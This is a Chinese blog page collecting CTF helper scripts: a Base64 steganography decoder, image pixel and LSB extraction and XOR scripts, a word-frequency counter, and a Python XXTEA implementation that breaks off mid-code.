

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="uert">
  <meta name="keywords" content="">
  
    <meta name="description" content="首先我个脚本小子不可能写得出来，都是抄的和chatgpt大哥写的，（ε&#x3D;(´ο｀*)))唉，看不见的大手发力了！！！！！！！ 为了避嫌我把原地找到了，不要来抓我，退一万步讲，，，，，哎！？你也听不到 有时候一个知道的知识点却不记得解题脚本放哪个wp里了，又懒得再写一遍。那就专门开个地方存起来。分类就不分了，有些脚本多个分区都能用。 Base64隐写来源 12345678910111213">
<meta property="og:type" content="article">
<meta property="og:title" content="脚本工具">
<meta property="og:url" content="https://theganlove.github.io/2024/09/01/%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="首先我个脚本小子不可能写得出来，都是抄的和chatgpt大哥写的，（ε&#x3D;(´ο｀*)))唉，看不见的大手发力了！！！！！！！ 为了避嫌我把原地找到了，不要来抓我，退一万步讲，，，，，哎！？你也听不到 有时候一个知道的知识点却不记得解题脚本放哪个wp里了，又懒得再写一遍。那就专门开个地方存起来。分类就不分了，有些脚本多个分区都能用。 Base64隐写来源 12345678910111213">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-09-01T13:39:36.000Z">
<meta property="article:modified_time" content="2024-09-03T10:01:36.760Z">
<meta property="article:author" content="uert">
<meta property="article:tag" content="脚本">
<meta name="twitter:card" content="summary_large_image">
  
  
  
  <title>脚本工具 - Hexo</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"theganlove.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>主题</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="脚本工具"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-09-01 21:39" pubdate>
          2024年9月1日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          9.4k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          79 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">脚本工具</h1>
            
            
              <div class="markdown-body">
                
                <p>首先我个脚本小子不可能写得出来，都是抄的和chatgpt大哥写的，（ε&#x3D;(´ο｀*)))唉，看不见的大手发力了！！！！！！！</p>
<p>为了避嫌我把原地找到了，不要来抓我，退一万步讲，，，，，哎！？你也听不到</p>
<p>有时候一个知道的知识点却不记得解题脚本放哪个wp里了，又懒得再写一遍。那就专门开个地方存起来。分类就不分了，有些脚本多个分区都能用。</p>
<h2 id="Base64隐写"><a href="#Base64隐写" class="headerlink" title="Base64隐写"></a>Base64隐写</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/349481870">来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Base64Stego_Decrypt</span>(<span class="hljs-params">LineList</span>):<br>    Base64Char = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>     <span class="hljs-comment">#Base64字符集 已按照规范排列</span><br>    BinaryText = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> LineList:<br>        <span class="hljs-keyword">if</span> line.find(<span class="hljs-string">&quot;==&quot;</span>) &gt; <span class="hljs-number">0</span>:     <span class="hljs-comment">#如果文本中有2个=符号</span><br>            temp = <span class="hljs-built_in">bin</span>(Base64Char.find(line[-<span class="hljs-number">3</span>]) &amp; <span class="hljs-number">15</span>)[<span class="hljs-number">2</span>:]      <span class="hljs-comment">#通过按位与&amp;15运算取出二进制数后4位 [2:]的作用是将0b过滤掉</span><br>            BinaryText = BinaryText+<span class="hljs-string">&quot;0&quot;</span>*(<span class="hljs-number">4</span>-<span class="hljs-built_in">len</span>(temp))+temp      <span class="hljs-comment">#高位补0</span><br>        <span class="hljs-keyword">elif</span> line.find(<span class="hljs-string">&quot;=&quot;</span>) &gt; <span class="hljs-number">0</span>:        <span class="hljs-comment">#如果文本中有1个=符号</span><br>            temp = <span class="hljs-built_in">bin</span>(Base64Char.find(line[-<span class="hljs-number">2</span>]) &amp; <span class="hljs-number">3</span>)[<span class="hljs-number">2</span>:]       <span class="hljs-comment">#通过按位与&amp;3运算取出二进制数后2位</span><br>            BinaryText = BinaryText+<span class="hljs-string">&quot;0&quot;</span>*(<span class="hljs-number">2</span>-<span class="hljs-built_in">len</span>(temp))+temp      <span class="hljs-comment">#高位补0</span><br>    Text = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(BinaryText) % <span class="hljs-number">8</span> != <span class="hljs-number">0</span>):       <span class="hljs-comment">#最终得到的隐写数据二进制位数不一定都是8的倍数，为了避免数组越界，加上一个判断</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;警告:二进制文本位数有误，将进行不完整解析。&quot;</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(BinaryText), <span class="hljs-number">8</span>):<br>            <span class="hljs-keyword">if</span>(i+<span class="hljs-number">8</span> &gt; <span class="hljs-built_in">len</span>(BinaryText)):<br>                Text = Text+<span class="hljs-string">&quot;-&quot;</span>+BinaryText[i:]<br>                <span class="hljs-keyword">return</span> Text<br>            <span class="hljs-keyword">else</span>:<br>                Text = Text+<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(BinaryText[i:i+<span class="hljs-number">8</span>], <span class="hljs-number">2</span>))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(BinaryText), <span class="hljs-number">8</span>):<br>            Text = Text+<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(BinaryText[i:i+<span class="hljs-number">8</span>], <span class="hljs-number">2</span>))      <span class="hljs-comment">#将得到的二进制数每8位一组对照ASCII码转化字符</span><br>        <span class="hljs-keyword">return</span> Text<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Base64_ForString_Decrypt</span>(<span class="hljs-params">Text</span>):     <span class="hljs-comment">#Base64解密</span><br>    <span class="hljs-keyword">try</span>:<br>        DecryptedText = <span class="hljs-built_in">str</span>(Text).encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        DecryptedText = base64.b64decode(DecryptedText)<br>        DecryptedText = DecryptedText.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> DecryptedText<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    Course = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;文件名:&quot;</span>)<br>    File = <span class="hljs-built_in">open</span>(Course, <span class="hljs-string">&quot;r&quot;</span>)<br>    LineList = File.read().splitlines()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;显式内容为:&quot;</span>)<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> LineList:<br>        <span class="hljs-built_in">print</span>(Base64_ForString_Decrypt(line),end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n隐写内容为:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(Base64Stego_Decrypt(LineList))<br></code></pre></td></tr></table></figure>

<h2 id="Clemency"><a href="#Clemency" class="headerlink" title="Clemency"></a>Clemency</h2><p>Clemency是在DEFCON CTF中由LegitBS发明的架构（好家伙出个题直接创造了一个架构）。原生ida不支持此架构，下方链接提供了大佬的插件脚本。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/cseagle/ida_clemency">地址</a></p>
<h2 id="提取图片内像素"><a href="#提取图片内像素" class="headerlink" title="提取图片内像素"></a>提取图片内像素</h2><p>提取图片透明度值异或。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br>m1 = m2 = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment"># 取大图二进制</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, img.size[<span class="hljs-number">0</span>], <span class="hljs-number">19</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, img.size[<span class="hljs-number">1</span>], <span class="hljs-number">19</span>):<br>        r,g,b,a = img.getpixel((x,y))<br>        m1 += <span class="hljs-built_in">str</span>(r &amp; <span class="hljs-number">1</span>)<br><span class="hljs-comment"># 取中间隐写图二进制</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">171</span>, <span class="hljs-number">171</span> + <span class="hljs-number">19</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">171</span>, <span class="hljs-number">171</span> + <span class="hljs-number">19</span>):<br>        r,g,b,a = img.getpixel((x,y))<br>        m2 += <span class="hljs-built_in">str</span>(a &amp; <span class="hljs-number">1</span>)<br><span class="hljs-comment"># 二进制串取异或</span><br>xor = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(A)^<span class="hljs-built_in">int</span>(B)) <span class="hljs-keyword">for</span> A,B <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(m1,m2))<br><span class="hljs-comment"># 二进制转字符串并输出</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(xor[i:i+<span class="hljs-number">8</span>], <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(xor), <span class="hljs-number">8</span>)))<br></code></pre></td></tr></table></figure>

<p>异或两张图片的完整rgb值，并用结果rgb值写另一张图片。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>image1 = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;n1.png&#x27;</span>)<br>image2 = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;n2.png&#x27;</span>)<br><span class="hljs-built_in">print</span>(image1.mode, image2.mode)<br>size = width, height = image1.size<br>new = Image.new(<span class="hljs-string">&#x27;RGBA&#x27;</span>, size)<br>img1 = image1.load()<br>img2 = image2.load()<br>data = new.load()<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        one = img1[x,y]<br>        two = img2[x,y]<br>        new_color = (one[<span class="hljs-number">0</span>] ^ two[<span class="hljs-number">0</span>],one[<span class="hljs-number">1</span>] ^ two[<span class="hljs-number">1</span>],one[<span class="hljs-number">2</span>] ^ two[<span class="hljs-number">2</span>])<br>        data[x,y]=new_color<br>new.save(<span class="hljs-string">&quot;flag.png&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>图片像素值(rgb)本身就是字节：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ctf.png&quot;</span>)<br>pixels = img.load()<br>msg = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img.size[<span class="hljs-number">1</span>]):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img.size[<span class="hljs-number">0</span>]):<br>        msg += <span class="hljs-built_in">bytes</span>(pixels[x, y])<br><span class="hljs-built_in">print</span>(msg.decode())<br></code></pre></td></tr></table></figure>

<h2 id="词频统计"><a href="#词频统计" class="headerlink" title="词频统计"></a>词频统计</h2><p>统计单词出现的次数就比较麻烦，需要自己构建字典。比如这道题：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Konmu/p/12527029.html">浪里淘沙</a>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ctf.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>data=f.read()<br>f.close()<br>statistics=&#123;&#125;<br>frequency=[]<br>num=[<span class="hljs-number">4</span>,<span class="hljs-number">8</span>,<span class="hljs-number">11</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">zipin</span>(<span class="hljs-params">lsit</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lsit:<br>        statistics.setdefault(data.count(i),<span class="hljs-built_in">str</span>(i))<br>        frequency.append(data.count(i))<br>    frequency.sort()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> num:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(statistics.get(frequency[i-<span class="hljs-number">1</span>])),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">return</span>(statistics)<br><br>letters=[]<br><span class="hljs-built_in">print</span>(zipin(letters))<br></code></pre></td></tr></table></figure>

<h2 id="xxtea"><a href="#xxtea" class="headerlink" title="xxtea"></a>xxtea</h2><p>解密与加密脚本的python实现。<a target="_blank" rel="noopener" href="https://www.cnblogs.com/DirWang/p/12198526.html">来源</a>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><br>_DELTA = <span class="hljs-number">0x9E3779B9</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_long2str</span>(<span class="hljs-params">v, w</span>):<br>    n = (<span class="hljs-built_in">len</span>(v) - <span class="hljs-number">1</span>) &lt;&lt; <span class="hljs-number">2</span><br>    <span class="hljs-keyword">if</span> w:<br>        m = v[-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> (m &lt; n - <span class="hljs-number">3</span>) <span class="hljs-keyword">or</span> (m &gt; n): <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span><br>        n = m<br>    s = struct.pack(<span class="hljs-string">&#x27;&lt;%iL&#x27;</span> % <span class="hljs-built_in">len</span>(v), *v)<br>    <span class="hljs-keyword">return</span> s[<span class="hljs-number">0</span>:n] <span class="hljs-keyword">if</span> w <span class="hljs-keyword">else</span> s<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_str2long</span>(<span class="hljs-params">s, w</span>):<br>    n = <span class="hljs-built_in">len</span>(s)<br>    m = (<span class="hljs-number">4</span> - (n &amp; <span class="hljs-number">3</span>) &amp; <span class="hljs-number">3</span>) + n<br>    s = s.ljust(m, <span class="hljs-string">b&quot;\0&quot;</span>)<br>    v = <span class="hljs-built_in">list</span>(struct.unpack(<span class="hljs-string">&#x27;&lt;%iL&#x27;</span> % (m &gt;&gt; <span class="hljs-number">2</span>), s))<br>    <span class="hljs-keyword">if</span> w: v.append(n)<br>    <span class="hljs-keyword">return</span> v<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params"><span class="hljs-built_in">str</span>, key</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span> == <span class="hljs-string">&#x27;&#x27;</span>: <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span><br>    v = _str2long(<span class="hljs-built_in">str</span>, <span class="hljs-literal">True</span>)<br>    k = _str2long(key.ljust(<span class="hljs-number">16</span>, <span class="hljs-string">b&quot;\0&quot;</span>), <span class="hljs-literal">False</span>)<br>    n = <span class="hljs-built_in">len</span>(v) - <span class="hljs-number">1</span><br>    z = v[n]<br>    y = v[<span class="hljs-number">0</span>]<br>    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>    q = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> // (n + <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span> q &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">sum</span> = (<span class="hljs-built_in">sum</span> + _DELTA) &amp; <span class="hljs-number">0xffffffff</span><br>        e = <span class="hljs-built_in">sum</span> &gt;&gt; <span class="hljs-number">2</span> &amp; <span class="hljs-number">3</span><br>        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span>  <span class="hljs-built_in">range</span>(n):<br>            y = v[p + <span class="hljs-number">1</span>]<br>            v[p] = (v[p] + ((z &gt;&gt; <span class="hljs-number">5</span> ^ y &lt;&lt; <span class="hljs-number">2</span>) + (y &gt;&gt; <span class="hljs-number">3</span> ^ z &lt;&lt; <span class="hljs-number">4</span>) ^ (<span class="hljs-built_in">sum</span> ^ y) + (k[p &amp; <span class="hljs-number">3</span> ^ e] ^ z))) &amp; <span class="hljs-number">0xffffffff</span><br>            z = v[p]<br>        y = v[<span class="hljs-number">0</span>]<br>        v[n] = (v[n] + ((z &gt;&gt; <span class="hljs-number">5</span> ^ y &lt;&lt; <span class="hljs-number">2</span>) + (y &gt;&gt; <span class="hljs-number">3</span> ^ z &lt;&lt; <span class="hljs-number">4</span>) ^ (<span class="hljs-built_in">sum</span> ^ y) + (k[n &amp; <span class="hljs-number">3</span> ^ e] ^ z))) &amp; <span class="hljs-number">0xffffffff</span><br>        z = v[n]<br>        q -= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> _long2str(v, <span class="hljs-literal">False</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params"><span class="hljs-built_in">str</span>, key</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span> == <span class="hljs-string">&#x27;&#x27;</span>: <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span><br>    v = _str2long(<span class="hljs-built_in">str</span>, <span class="hljs-literal">False</span>)<br>    k = _str2long(key.ljust(<span class="hljs-number">16</span>, <span class="hljs-string">b&quot;\0&quot;</span>), <span class="hljs-literal">False</span>)<br>    n = <span class="hljs-built_in">len</span>(v) - <span class="hljs-number">1</span><br>    z = v[n]<br>    y = v[<span class="hljs-number">0</span>]<br>    q = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> // (n + <span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">sum</span> = (q * _DELTA) &amp; <span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">sum</span> != <span class="hljs-number">0</span>):<br>        e = <span class="hljs-built_in">sum</span> &gt;&gt; <span class="hljs-number">2</span> &amp; <span class="hljs-number">3</span><br>        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>            z = v[p - <span class="hljs-number">1</span>]<br>            v[p] = (v[p] - ((z &gt;&gt; <span class="hljs-number">5</span> ^ y &lt;&lt; <span class="hljs-number">2</span>) + (y &gt;&gt; <span class="hljs-number">3</span> ^ z &lt;&lt; <span class="hljs-number">4</span>) ^ (<span class="hljs-built_in">sum</span> ^ y) + (k[p &amp; <span class="hljs-number">3</span> ^ e] ^ z))) &amp; <span class="hljs-number">0xffffffff</span><br>            y = v[p]<br>        z = v[n]<br>        v[<span class="hljs-number">0</span>] = (v[<span class="hljs-number">0</span>] - ((z &gt;&gt; <span 